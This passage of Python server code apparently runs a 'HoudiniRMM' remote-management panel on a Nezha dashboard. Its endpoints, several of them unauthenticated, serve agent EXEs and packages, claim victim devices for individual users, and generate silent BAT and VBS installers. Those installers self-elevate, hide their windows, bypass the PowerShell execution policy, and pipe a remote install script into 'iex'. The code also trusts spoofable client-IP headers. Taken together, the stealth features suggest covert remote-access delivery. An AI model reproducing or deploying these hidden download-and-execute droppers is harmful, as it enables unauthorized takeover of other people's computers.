            cookie = self.headers.get("Cookie") or ""
            m = re.search(r"(?:^|;\s*)nz-jwt=([^;]+)", cookie)
            if m:
                token = m.group(1)
        if not token:
            self._cached_profile = None
            return None
        try:
            # Forward the actual client IP (from CF/nginx headers) so the
            # Nezha dashboard's IP-bound JWT validation passes.
            client_ip = (
                self.headers.get("CF-Connecting-IP")
                or self.headers.get("X-Real-IP")
                or self.headers.get("X-Forwarded-For")
                or "127.0.0.1"
            )
            client_ip = client_ip.split(",")[0].strip()
            req = urllib.request.Request(
                f"{DASHBOARD}/api/v1/profile",
                headers={"Authorization": "Bearer " + token, "X-Real-IP": client_ip, "X-Forwarded-For": client_ip},
            )
            data = json.loads(urllib.request.urlopen(req, timeout=10).read())
            prof_data = data.get("data")
            if not prof_data or not isinstance(prof_data, dict):
                self._cached_profile = None
                return None
            self._cached_profile = prof_data
            return self._cached_profile
        except Exception:
            self._cached_profile = None
            return None

    def _calling_user_role(self):
        prof = self._calling_user_profile()
        if prof is None:
            return None
        return int(prof.get("role", 0) or 0)

    def _calling_username(self):
        prof = self._calling_user_profile()
        if prof is None:
            return "admin"
        return prof.get("username") or "admin"

    def _calling_user_id(self):
        prof = self._calling_user_profile()
        if prof is None:
            return None
        try:
            return int(prof.get("id") or 0)
        except Exception:
            return None

    def _calling_user_agent_secret(self):
        """Agent secret of the browser user (from their profile).
        Returns None for unauthenticated or admin (admin uses global secret)."""
        prof = self._calling_user_profile()
        if prof is None:
            return None
        role = int(prof.get("role", 0) or 0)
        if role == 0:
            return None  # admin uses the global agent_secret_key
        return prof.get("agent_secret") or None

    def _check_device_ownership(self, device_ids):
        """Verify the calling user owns all given device IDs.
        Admin (role=0) always passes. Non-admin users must own all devices.
        Returns (ok: bool, error: str or None)."""
        role = self._calling_user_role()
        if role == 0:
            return True, None  # admin can manage all devices
        uid = self._calling_user_id()
        if uid is None:
            return False, "unauthorized"
        try:
            devices = list_devices()
            owned = {d["id"] for d in devices if int((d.get("id") or 0)) in set(device_ids)
                     and int((d.get("_owner_id") or 0)) == uid}
            if len(owned) != len(set(device_ids)):
                return False, "you can only manage your own devices"
            return True, None
        except Exception as e:
            return False, str(e)

    def _require_admin(self) -> bool:
        return self._calling_user_role() == 0

    def _json(self, code: int, obj: dict):
        raw = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def _html(self, code: int, html: str):
        raw = html.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def _read_json(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b"{}"
        try:
            return json.loads(body.decode() or "{}")
        except (json.JSONDecodeError, UnicodeDecodeError):
            return {}

    def do_GET(self):
        global ICON_PATH
        raw_path = urlparse(self.path).path
        # Public sign-in page at /login
        if raw_path in ("/login", "/login/"):
            try:
                html = LOGIN_PAGE.read_text(encoding="utf-8")
            except Exception:
                html = "<h1>Sign in</h1><p>login.html missing</p>"
            return self._html(200, html)

        path = self._strip_prefix(raw_path)

        # Public health check
        if path == "/api/health":
            return self._json(200, {"ok": True, "version": AGENT_VERSION, "uptime": time.time() - START_TIME})

        if path in ("/", "/index.html"):
            if not self._authorized():
                return self._html(401, "<h1>Unauthorized</h1><p>Sign in at /login first.</p>")
            return self._html(200, HTML)

        if path == "/api/security/status":
            sec = hf.load_security()
            return self._json(200, {"ok": True, "totp_enabled": bool(sec.get("totp_enabled"))})

        # Public agent zip download (used by the PowerShell installer script)
        if path == "/api/agent-zip/windows":
            try:
                from urllib.parse import quote
                # Non-admin users get unsigned exe via build_package with their secret
                user_secret = self._calling_user_agent_secret()
                if user_secret:
                    b = load_branding()
                    b = dict(b)
                    b["client_secret"] = user_secret
                    zp = build_package("windows", b, use_signed=False, uid=0)
                else:
                    zp = ensure_official("windows")
                data = zp.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "application/zip")
                self.send_header("Content-Disposition", f'attachment; filename="{quote(zp.name)}"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            except Exception as e:
                self._json(500, {"ok": False, "error": str(e)})
            return

        # Public: build and serve the full RMM agent package ZIP (binary + config + tg-report)
        if path == "/api/claim-device":
            # Claim a device by enrollment token + UUID
            # Called by the install script after agent registers
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(length) or "{}")
                token = str(body.get("token") or "").strip()
                uuid = str(body.get("uuid") or "").strip()
                if not token or not uuid:
                    return self._json(400, {"ok": False, "error": "token and uuid required"})
                resolved = resolve_claim_token(token)
                if not resolved:
                    return self._json(403, {"ok": False, "error": "invalid or expired token"})
                target_uid = resolved[0]
                # Find the device by UUID in Nezha dashboard
                s = DashSession().login()
                data = s.get("/api/v1/server")
                servers = data.get("data") or []
                device_id = None
                for d in servers:
                    if (d.get("uuid") or "") == uuid:
                        device_id = d.get("id")
                        break
                if not device_id:
                    return self._json(404, {"ok": False, "error": "device not found (agent may not have registered yet)"})
                # Transfer ownership via direct DB update (batch-move API has a caching bug)
                import sqlite3 as _sqlite3
                _db_path = "/opt/nezha/dashboard/data/sqlite.db"
                _conn = _sqlite3.connect(_db_path)
                try:
                    _conn.execute("UPDATE servers SET user_id=? WHERE id=?", (target_uid, device_id))
                    _conn.commit()
                finally:
                    _conn.close()
                return self._json(200, {"ok": True, "device_id": device_id, "owner_id": target_uid})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})
            return

        if path == "/api/package-zip":
            try:
                b = load_branding()
                # Check for claim token in query string (from install script on target machine)
                # or the caller's auth (if downloading from the browser).
                parsed = urlparse(self.path)
                qs = parse_qs(parsed.query)
                claim = (qs.get("claim") or [""])[0]
                user_secret = None
                if claim:
                    resolved = resolve_claim_token(claim)
                    if resolved:
                        user_secret = resolved[1]
                if not user_secret:
                    user_secret = self._calling_user_agent_secret()
                use_signed = True
                build_uid = self._calling_user_id() or 0
                if user_secret:
                    b = dict(b)
                    # Use the global agent_secret_key for agent gRPC connections.
                    # Per-user agent_secret is for API access only, not for agent connections.
                    # Device ownership is tracked by the dashboard via UUID.
                    b["client_secret"] = _global_agent_secret()
                    use_signed = False
                    # Create enrollment token for non-admin users
                    if build_uid and build_uid != 1:
                        b["enrollment_token"] = create_claim_token(build_uid, user_secret)
                # Determine uid for per-user TG config and enrollment token
                pkg_uid = 0
                if user_secret:
                    resolved_uid = None
                    if claim:
                        resolved = resolve_claim_token(claim)
                        if resolved:
                            resolved_uid = resolved[0]
                    if resolved_uid is None:
                        resolved_uid = self._calling_user_id() or 0
                    pkg_uid = resolved_uid or 0
                    # Create enrollment token for this user so the install
                    # script can claim the device after agent registers
                    if pkg_uid and pkg_uid != 1:  # not admin
                        b["enrollment_token"] = create_claim_token(pkg_uid, user_secret)
                zp = build_package("windows", b, use_signed=use_signed, uid=pkg_uid)
                data = zp.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "application/zip")
                self.send_header("Content-Disposition", f'attachment; filename="{zp.name}"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            except Exception as e:
                self._json(500, {"ok": False, "error": str(e)})
            return

        # Public: serve the PowerShell installer script as a downloadable .ps1 file
        if path == "/api/install-script":
            fp = Path("/opt/nezha/agent-builder/static/install.ps1")
            if not fp.exists():
                return self._json(404, {"ok": False, "error": "install script not found"})
            data = fp.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Disposition", 'attachment; filename="install.ps1"')
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        # Public: serve static files (VBS, etc.)
        if path.startswith("/api/static/"):
            name = os.path.basename(path[len("/api/static/") :])
            fp = Path("/opt/nezha/agent-builder/static") / name
            if not fp.exists():
                return self._json(404, {"ok": False, "error": "not found"})
            data = fp.read_bytes()
            ctype = "application/octet-stream"
            if name.endswith(".ps1"): ctype = "text/plain; charset=utf-8"
            elif name.endswith(".vbs"): ctype = "text/plain; charset=utf-8"
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Disposition", f'attachment; filename="{name}"')
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        # Public: serve the latest built agent EXE
        if path == "/api/agent-exe":
            # Non-admin users get unsigned exe; admin gets signed if available.
            # Check claim token (from one-liner on target machine) or auth cookie.
            parsed_ae = urlparse(self.path)
            qs_ae = parse_qs(parsed_ae.query)
            claim_ae = (qs_ae.get("claim") or [""])[0]
            user_secret = None
            resolved_uid_ae = 0
            if claim_ae:
                resolved_ae = resolve_claim_token(claim_ae)
                if resolved_ae:
                    user_secret = resolved_ae[1]
                    resolved_uid_ae = resolved_ae[0] or 0
            if not user_secret:
                user_secret = self._calling_user_agent_secret()
                if user_secret:
                    resolved_uid_ae = self._calling_user_id() or 0
            if user_secret:
                # Non-admin user: build a fresh ZIP package with their secret
                # (NOT an EXE — EXE builds require Go compilation and would
                # share admin's signed binary). The install-exe-script handles
                # ZIP packages too (it downloads and extracts).
                try:
                    b = load_branding()
                    b = dict(b)
                    b["client_secret"] = user_secret
                    zp = build_package("windows", b, use_signed=False, uid=resolved_uid_ae)
                    data = zp.read_bytes()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/zip")
                    self.send_header("Content-Disposition", f'attachment; filename="{zp.name}"')
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    self.wfile.write(data)
                except Exception as e:
                    self._json(500, {"ok": False, "error": str(e)})
                return
            # Admin: serve signed EXE if available, else latest build from OUT/
            if SIGNED_EXE.exists():
                data = SIGNED_EXE.read_bytes()
                name = "agent-signed.exe"
            else:
                exes = sorted(OUT.glob("*-Setup-windows-amd64-*.exe"), key=lambda p: p.stat().st_mtime, reverse=True)
                if not exes:
                    return self._json(404, {"ok": False, "error": "no builds yet"})
                fp = exes[0]
                name = fp.name
                data = fp.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "application/vnd.microsoft.portable-executable")
            self.send_header("Content-Disposition", f'attachment; filename="{name}"')
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        # Public: build and serve silent installer (BAT + VBS wrappers)
        if path == "/api/build-installer":
            from urllib.parse import quote
            import tempfile, shutil as _shutil, zipfile, io
            td = tempfile.mkdtemp(prefix="rmm_installer_")
            try:
                b = load_branding()
                product = safe_name(b.get("product_name", "HoudiniRMM"))
                srv_host = str(b.get("server", "rmm.houdini.fastmoneyclaim.com:443")).split(":")[0]
                srv = f"https://{srv_host}"
                # Check for claim token in query string
                parsed_bi = urlparse(self.path)
                qs_bi = parse_qs(parsed_bi.query)
                claim_bi = (qs_bi.get("claim") or [""])[0]
                claim_suffix_bi = f"?claim={claim_bi}" if claim_bi else ""
                bat = Path(td) / f"{product}-Installer.bat"
                vbs = Path(td) / f"{product}-Installer.vbs"
                bat_txt = f'''@echo off\r\nnet session >nul 2>&1\r\nif %errorlevel% neq 0 (\r\n    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"\r\n    exit /b\r\n)\r\necho Installing {product}...\r\npowershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f=Join-Path $env:TEMP 'install.ps1';(New-Object Net.WebClient).DownloadFile('{srv}/dashboard/api/install-script{claim_suffix_bi}',$f);Start-Process powershell -Verb RunAs -ArgumentList '-NoP -Ep Bypass -File',$f -Wait"\r\ntimeout /t 3 /nobreak >nul 2>&1\r\nif exist "%TEMP%\\install.ps1" del /q "%TEMP%\\install.ps1" 2>nul\r\necho Done.\r\n'''
                vbs_txt = 'CreateObject("WScript.Shell").Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iwr -UseBasicParsing ' + "''" + f'{srv}/dashboard/api/install-script{claim_suffix_bi}' + "''" + ' | iex""", 0, False' + chr(13) + chr(10)
                bat.write_text(bat_txt, encoding="ascii")
                vbs.write_text(vbs_txt, encoding="ascii")
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                    zf.writestr(bat.name, bat.read_bytes())
                    zf.writestr(vbs.name, vbs.read_bytes())
                data = buf.getvalue()
                self.send_response(200)
                self.send_header("Content-Type", "application/zip")
                self.send_header("Content-Disposition", f'attachment; filename="{product}-silent-installer.zip"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            except Exception as e:
                self._json(500, {"ok": False, "error": str(e)})
            finally:
                _shutil.rmtree(td, ignore_errors=True)
            return

        # Public: serve EXE installer PowerShell script
        if path == "/api/install-exe-script":
            try:
                b = load_branding()
                product = safe_name(b.get("product_name", "HoudiniRMM"))
                srv = "https://" + str(b.get("server", "rmm.houdini.fastmoneyclaim.com:443")).split(":")[0]
                ps = f'''$ErrorActionPreference="Stop"
$url="{srv}/dashboard/api/agent-exe"
$f=Join-Path $env:TEMP "{product}-Agent.exe"
Write-Host "Downloading {product}..."
iwr -UseBasicParsing $url -OutFile $f
Write-Host "Installing..."
Start-Process $f -Verb RunAs -WindowStyle Minimized -Wait
Remove-Item $f -Force
Write-Host "Done."
'''
                data = ps.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Disposition", f'attachment; filename="{product}-Install.ps1"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            except Exception as e:
                self._json(500, {"ok": False, "error": str(e)})
            return

        if not self._authorized() and path.startswith("/api/"):
            return self._json(401, {"ok": False, "error": "unauthorized"})

        # Admin-only builder API (device management, builds, security, system, audit, users, telegram)
        admin_only = (
            path == "/api/system"
            or path.startswith("/api/users")
            or path == "/api/sync"
        )
        if admin_only and not self._require_admin():
            return self._json(403, {"ok": False, "error": "admin privileges required"})

        if path == "/api/users":
            try:
                data = list_users()
                return self._json(200, {"ok": True, "users": data.get("data") or []})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path.startswith("/api/nx/"):
            res_key = path[len("/api/nx/") :].strip("/")
            if res_key not in RESOURCE_MAP:
                return self._json(400, {"ok": False, "error": "unknown resource"})
            try:
                data = nz_list(RESOURCE_MAP[res_key])
                payload = data.get("data") if isinstance(data, dict) else data
                if isinstance(payload, dict):
                    payload = [dict(v, id=k) if isinstance(v, dict) and "id" not in v else v for k, v in payload.items()]
                if payload is None:
                    payload = []
                payload = [
                    {**v["group"], **{k: x for k, x in v.items() if k != "group"}}
                    if isinstance(v, dict) and isinstance(v.get("group"), dict) else v
                    for v in payload
                ]
                return self._json(200, {"ok": True, "data": payload})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/branding":
            prof = self._calling_user_profile()
            if prof is None:
                return self._json(401, {"ok": False, "error": "unauthorized"})
            return self._json(200, {"ok": True, "branding": load_branding()})

        if path == "/api/devices":
            try:
                # Require valid user authentication
                prof = self._calling_user_profile()
                if prof is None:
                    return self._json(401, {"ok": False, "error": "unauthorized"})
                uid = self._calling_user_id()
                role = self._calling_user_role()
                # Admin sees only admin-owned devices (owner_id == admin's uid or 0).
                # Non-admin users see only their own devices.
                if role == 0 or uid is None or uid == 0:
                    # Pass admin's actual uid so list_devices can filter
                    owner_filter = -1  # sentinel: list_devices will show owner_id==0 or owner_id==admin_uid
                    admin_uid = uid or 0
                else:
                    owner_filter = uid
                    admin_uid = 0
                devices = list_devices(owner_filter, admin_uid=admin_uid)
                # Non-admin users: filter out hidden devices
                if role != 0 and uid:
                    hidden = load_hidden_devices(uid)
                    if hidden:
                        devices = [d for d in devices if d.get("id") not in hidden]
                meta_all = hf.load_meta()
                for d in devices:
                    d["meta"] = dict(meta_all.get(str(d.get("id"))) or {"tags": [], "notes": "", "site": "", "customer": ""})
                summary = hf.offline_summary(devices)
                return self._json(200, {"ok": True, "devices": devices, "offline_summary": summary})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/user-devices":
            if not self._require_admin():
                return self._json(403, {"ok": False, "error": "admin privileges required"})
            try:
                admin_uid_ud = self._calling_user_id() or 0
                all_devices = list_devices(None)  # all devices
                meta_all = hf.load_meta()
                user_devices = []
                for d in all_devices:
                    owner_id = d.get("_owner_id") or 0
                    owner_name = d.get("_owner_name") or ""
                    # Exclude admin-owned devices (owner_id == 0 or admin's uid)
                    if owner_id not in (0, admin_uid_ud) and owner_name:
                        d["meta"] = dict(meta_all.get(str(d.get("id"))) or {"tags": [], "notes": "", "site": "", "customer": ""})
                        user_devices.append(d)
                return self._json(200, {"ok": True, "devices": user_devices})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/cfg":
            prof_cfg = self._calling_user_profile()
            if prof_cfg is None:
                return self._json(401, {"ok": False, "error": "unauthorized"})
            return self._json(200, {"ok": True, "cfg": load_cfg()})

        if path == "/api/icon":
            icon = ICON_PATH
            for p in DATA.glob("icon.*"):
                icon = p
                break
            if not icon.exists():
                logo = Path("/opt/nezha/dashboard/user-dist/logo.svg")
                if logo.exists():
                    icon = logo
            if icon.exists():
                data = icon.read_bytes()
                ctype = "image/png"
                if icon.suffix.lower() in (".jpg", ".jpeg"):
                    ctype = "image/jpeg"
                elif icon.suffix.lower() == ".ico":
                    ctype = "image/x-icon"
                self.send_response(200)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
            return


        if path == "/api/audit":
            prof_a = self._calling_user_profile()
            if prof_a is None:
                return self._json(401, {"ok": False, "error": "unauthorized"})
            qs = parse_qs(urlparse(self.path).query)
            try:
                limit = int((qs.get("limit") or ["200"])[0] or 200)
            except (ValueError, TypeError):
                limit = 200
            events = hf.list_audit(limit)
            # Non-admin users only see their own audit events
            is_admin = (self._calling_user_role() == 0)
            if not is_admin:
                username = ""
                prof = self._calling_user_profile()
                if prof:
                    username = prof.get("username") or ""
                if username:
                    events = [e for e in events if e.get("actor") == username]
                else:
                    events = []
            return self._json(200, {"ok": True, "events": events})

        if path == "/api/scripts":
            prof_s = self._calling_user_profile()
            if prof_s is None:
                return self._json(401, {"ok": False, "error": "unauthorized"})
            return self._json(200, {"ok": True, "scripts": hf.load_scripts()})

        if path == "/api/device-meta":
            qs = parse_qs(urlparse(self.path).query)
            did = (qs.get("id") or [""])[0]
            if not did:
                return self._json(400, {"ok": False, "error": "id required"})
            return self._json(200, {"ok": True, "meta": hf.get_device_meta(did)})

        if path == "/api/security":
            sec = hf.load_security()
            public = {
                "totp_enabled": bool(sec.get("totp_enabled")),
                "roles": sec.get("roles") or {},
                "default_role": sec.get("default_role") or "admin",
            }
            return self._json(200, {"ok": True, "security": public})



        if path == "/api/system":
            try:
                import yaml
                cfg_path = Path("/opt/nezha/dashboard/data/config.yaml")
                cfg = yaml.safe_load(cfg_path.read_text(encoding="utf-8")) or {}
                # redact secrets
                public = dict(cfg)
                for secret in ("jwt_secret_key", "agent_secret_key"):
                    if secret in public and public[secret]:
                        public[secret] = "(set)"
                return self._json(200, {"ok": True, "config": public})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/tg":
            uid = self._calling_user_id() or 0
            c = load_tg_for(uid)
            token = (c.get("bot_token") or "").strip()
            return self._json(
                200,
                {
                    "ok": True,
                    "tg": {
                        "configured": bool(token and (c.get("chat_id") or "").strip()),
                        "bot_token": (token[:8] + "…" if token else ""),
                        "chat_id": c.get("chat_id") or "",
                        "monitor": bool(c.get("monitor", True)),
                    },
                },
            )

        if path == "/api/builds":
            prof_b = self._calling_user_profile()
            if prof_b is None:
                return self._json(401, {"ok": False, "error": "unauthorized"})
            calling_uid = self._calling_user_id() or 0
            is_admin = (self._calling_user_role() == 0)
            owners = load_build_owners()
            items = []
            files = list(OUT.glob("*.zip")) + list(OUT.glob("*.exe"))
            try:
                files = sorted(files, key=lambda x: x.stat().st_mtime, reverse=True)[:40]
            except Exception:
                files = files[:40]
            for p in files:
                # Non-admin users only see their own builds
                file_owner = owners.get(p.name, 0)
                if not is_admin and file_owner != calling_uid:
                    continue
                st = p.stat()
                is_exe = p.suffix.lower() == ".exe"
                items.append(
                    {
                        "name": p.name,
                        "size": f"{st.st_size/1024/1024:.2f} MB",
                        "mtime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)),
                        "kind": "Embedded EXE" if is_exe else "ZIP package",
                        "standalone": is_exe,
                    }
                )
            return self._json(200, {"ok": True, "builds": items})

        if path == "/api/powershell/install-script":
            try:
                b = load_branding()
                if not b.get("server") or not b.get("client_secret"):
                    return self._json(400, {"ok": False, "error": "build config missing - save branding first"})
                # All builds use global client_secret
                script = powershell_install_script(b)
                select = "for all devices"
                return self._json(200, {
                    "ok": True,
                    "script": {
                        "text": script,
                        "server": b.get("server"),
                        "tls": bool(b.get("tls", True)),
                        "product_name": b.get("product_name") or "HoudiniRMM",
                    },
                    "select": select,
                })
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path.startswith("/api/download/"):
            name = os.path.basename(path[len("/api/download/") :])
            fp = OUT / name
            if not fp.exists():
                return self._json(404, {"ok": False, "error": "not found"})
            # Non-admin users can only download their own builds
            is_admin = (self._calling_user_role() == 0)
            if not is_admin:
                file_owner = get_build_owner(name)
                calling_uid = self._calling_user_id() or 0
                if file_owner != calling_uid:
                    return self._json(403, {"ok": False, "error": "you can only download your own builds"})
            data = fp.read_bytes()
            self.send_response(200)
            if name.lower().endswith(".exe"):
                ctype = "application/vnd.microsoft.portable-executable"
            elif name.lower().endswith(".zip"):
                ctype = "application/zip"
            else:
                ctype = "application/octet-stream"
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Disposition", f'attachment; filename="{name}"')
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        if path == "/api/screenconnect/status":
            prof_sc = self._calling_user_profile()
            if prof_sc is None:
                return self._json(401, {"ok": False, "error": "unauthorized"})
            uid = self._calling_user_id() or 0
            sc_dir = user_screenconnect_dir(uid)
            sc_dir.mkdir(parents=True, exist_ok=True)
            try:
                files = sorted(sc_dir.glob("*.msi"), key=lambda p: p.stat().st_mtime, reverse=True)
            except Exception:
                files = []
            return self._json(200, {"ok": True, "file": files[0].name if files else None, "size": files[0].stat().st_size if files else 0})

        if path == "/api/notifications":
            return self._json(200, {"ok": True, "notifications": load_notifs()})

        if path == "/api/screenconnect/task-status":
            qs = parse_qs(urlparse(self.path).query)
            cid = (qs.get("id", [""])[0] or "").strip()
            if not cid:
                return self._json(400, {"ok": False, "error": "id required"})
            try:
                s = DashSession().login()
                log_resp = s.get(f"/api/v1/cron/{cid}/log")
                return self._json(200, {"ok": True, "log": log_resp})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        self._json(404, {"ok": False, "error": "not found"})

    def do_POST(self):
        global ICON_PATH
        path = self._strip_prefix(urlparse(self.path).path)

        # Public: claim device by enrollment token (called by install script, no auth)
        if path == "/api/claim-device":
            _claim_ip = self.headers.get("X-Real-IP") or self.client_address[0]
            if not check_claim_rate(_claim_ip):
                return self._json(429, {"ok": False, "error": "Too many claim attempts, try again later"})
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(length) or "{}")
                token = str(body.get("token") or "").strip()
                uuid = str(body.get("uuid") or "").strip()
                if not token or not uuid:
                    return self._json(400, {"ok": False, "error": "token and uuid required"})
                resolved = resolve_claim_token(token)
                if not resolved:
                    return self._json(403, {"ok": False, "error": "invalid or expired token"})
                target_uid = resolved[0]
                s = DashSession().login()
                data = s.get("/api/v1/server")
                servers = data.get("data") or []
                device_id = None
                for d in servers:
                    if (d.get("uuid") or "") == uuid:
                        device_id = d.get("id")
                        break
                if not device_id:
                    return self._json(404, {"ok": False, "error": "device not found (agent may not have registered yet)"})
                import sqlite3 as _sqlite3
                _conn = _sqlite3.connect('/opt/nezha/dashboard/data/sqlite.db')
                try:
                    _conn.execute('UPDATE servers SET user_id=? WHERE id=?', (target_uid, device_id))
                    _conn.commit()
                finally:
                    _conn.close()
                return self._json(200, {"ok": True, "device_id": device_id, "owner_id": target_uid})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})
            return

        if not self._authorized():
            return self._json(401, {"ok": False, "error": "unauthorized"})

        # Admin-only mutations (operational resources via /api/nx are allowed for all logged-in users)
        admin_only_post = (
            path.startswith("/api/users")
            or path == "/api/notifications/delete"
            or path == "/api/notifications/push"
            or path == "/api/signed-exe/upload"
            or path == "/api/rename-device"
            or path == "/api/builds/clear"
        )
        if admin_only_post and not self._require_admin():
            return self._json(403, {"ok": False, "error": "admin privileges required"})

        if path == "/api/users/create":
            body = self._read_json()
            username = (body.get("username") or "").strip()
            password = body.get("password") or ""
            role = body.get("role", 1)
            if not username or not password:
                return self._json(400, {"ok": False, "error": "username and password are required"})
            res = create_user(username, password, role)
            if not res.get("success"):
                return self._json(400, {"ok": False, "error": res.get("error") or str(res)})
            hf.audit("user.create", {"username": username, "role": role}, actor=self._calling_username())
            return self._json(200, {"ok": True, "id": res.get("data")})

        if path.startswith("/api/users/update/"):
            rid = path[len("/api/users/update/") :].strip("/")
            if not rid.isdigit():
                return self._json(400, {"ok": False, "error": "invalid id"})
            body = self._read_json()
            if "role" in body:
                body["role"] = int(body["role"] or 1)
            res = update_user(int(rid), body)
            hf.audit("user.update", {"id": int(rid), "fields": list(body.keys())}, actor=self._calling_username())
            return self._json(200 if res.get("success") else 400, {"ok": bool(res.get("success")), "error": res.get("error")})

        if path.startswith("/api/users/delete/"):
            rid = path[len("/api/users/delete/") :].strip("/")
            if not rid.isdigit():
                return self._json(400, {"ok": False, "error": "invalid id"})
            res = delete_user(int(rid))
            hf.audit("user.delete", {"id": int(rid)}, actor=self._calling_username())
            return self._json(200 if res.get("success") else 400, {"ok": bool(res.get("success")), "error": res.get("error")})

        if path.startswith("/api/nx/"):
            rest = path[len("/api/nx/") :].strip("/")
            parts = [p for p in rest.split("/") if p]
            res_key = parts[0] if parts else ""
            if res_key not in RESOURCE_MAP:
                return self._json(400, {"ok": False, "error": "unknown resource"})
            if len(parts) == 2 and parts[1] == "create":
                body = self._read_json()
                res = nz_create(RESOURCE_MAP[res_key], body)
                if not res.get("success"):
                    return self._json(400, {"ok": False, "error": res.get("error") or str(res)})
                hf.audit("nz.create", {"resource": res_key, "id": res.get("data")}, actor=self._calling_username())
                return self._json(200, {"ok": True, "id": res.get("data")})
            if len(parts) == 3 and parts[2] == "delete":
                rid = parts[1]
                res = nz_delete(RESOURCE_MAP[res_key], rid)
                ok = bool(res.get("success"))
                if ok:
                    hf.audit("nz.delete", {"resource": res_key, "id": rid}, actor=self._calling_username())
                return self._json(200 if ok else 400, {"ok": ok, "error": res.get("error")})
            if len(parts) == 2:
                body = self._read_json()
                res = nz_update(RESOURCE_MAP[res_key], parts[1], body)
                ok = bool(res.get("success"))
                if ok:
                    hf.audit("nz.update", {"resource": res_key, "id": parts[1]}, actor=self._calling_username())
                return self._json(200 if ok else 400, {"ok": ok, "error": res.get("error")})
            return self._json(400, {"ok": False, "error": "bad path"})

        if path == "/api/devices/delete":
            body = self._read_json()
            try:
                ids = [int(x) for x in (body.get("ids") or [])]
            except (ValueError, TypeError):
                return self._json(400, {"ok": False, "error": "invalid device ids"})
            ok, err = self._check_device_ownership(ids)
            if not ok:
                return self._json(403, {"ok": False, "error": err})
            # Non-admin users: only hide devices from their panel, don't delete from server
            role = self._calling_user_role()
            uid = self._calling_user_id()
            if role != 0 and uid:
                for did in ids:
                    hide_device_for_user(uid, did)
                hf.audit("devices.hide", {"ids": ids}, actor=self._calling_username())
                return self._json(200, {"ok": True, "message": "Device(s) removed from your panel.", "hidden": True})
            # Admin: actually delete and optionally uninstall
            remote = bool(body.get("remote_uninstall", True))
            wait_seconds = float(body.get("wait_seconds") or 5)
            try:
                if remote:
                    res = uninstall_devices(ids, remove_from_panel=True, wait_seconds=wait_seconds)
                    if not res.get("success"):
                        return self._json(400, {"ok": False, **{k: v for k, v in res.items() if k != "ok"}})
                    _actor3 = "admin"
                    try:
                        _prof3 = self._calling_user_profile()
                        if _prof3:
                            _actor3 = _prof3.get("username") or "admin"
                    except Exception:
                        pass
                    hf.audit("devices.delete", {"ids": ids, "remote_uninstall": True, "cron_id": res.get("cron_id")}, actor=_actor3)
                    return self._json(200, {"ok": True, "message": res.get("message", "Removed from panel and uninstalled from device(s)."), "result": res})
                res = delete_devices(ids)
                ok = bool(res.get("success", True)) if isinstance(res, dict) else True
                if res.get("error") and not res.get("success"):
                    return self._json(400, {"ok": False, "error": res.get("error"), "raw": res})
                hf.audit("devices.delete", {"ids": ids, "remote_uninstall": False, "ok": ok}, actor=self._calling_username())
                return self._json(200, {"ok": ok, "result": res})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/devices/uninstall":
            body = self._read_json()
            try:
                ids = [int(x) for x in (body.get("ids") or [])]
            except (ValueError, TypeError):
                return self._json(400, {"ok": False, "error": "invalid device ids"})
            ok, err = self._check_device_ownership(ids)
            if not ok:
                return self._json(403, {"ok": False, "error": err})
            # Non-admin users: only hide devices from their panel, don't uninstall agent
            role = self._calling_user_role()
            uid = self._calling_user_id()
            if role != 0 and uid:
                for did in ids:
                    hide_device_for_user(uid, did)
                hf.audit("devices.hide", {"ids": ids, "action": "uninstall"}, actor=self._calling_username())
